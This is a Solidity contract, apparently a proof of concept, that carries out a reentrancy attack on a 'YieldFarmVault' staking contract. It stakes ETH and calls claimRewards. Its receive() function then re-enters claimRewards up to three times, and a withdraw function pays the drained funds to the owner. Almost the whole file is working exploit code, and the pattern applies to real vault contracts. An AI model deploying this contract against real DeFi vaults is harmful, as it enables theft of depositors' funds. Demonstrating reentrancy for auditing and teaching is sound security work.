// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IYieldFarmVault {
    function stake() external payable;
    function claimRewards() external;
    function stakeBalance(address) external view returns (uint256);
}

/// @title MaliciousReentrancy
/// @notice A contract to demonstrate the reentrancy vulnerability in YieldFarmVault
contract MaliciousReentrancy {
    IYieldFarmVault public immutable vault;
    address public owner;
    uint256 public attackCount;
    uint256 public maxAttacks = 3; // Limit attacks to prevent infinite loop
    
    constructor(address _vault) {
        vault = IYieldFarmVault(_vault);
        owner = msg.sender;
    }
    
    function attack() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value > 0, "Need ETH to attack");
        
        // Step 1: Stake ETH in the vulnerable contract
        vault.stake{value: msg.value}();
        
        // Step 2: Start the reentrancy attack
        attackCount = 0;
        vault.claimRewards();
    }
    
    // This function will be called when the vault sends ETH
    receive() external payable {
        // Reentrancy: call claimRewards again if we haven't exceeded max attacks
        // and if we still have a balance in the vault
        if (attackCount < maxAttacks && vault.stakeBalance(address(this)) > 0) {
            attackCount++;
            vault.claimRewards();
        }
    }
    
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
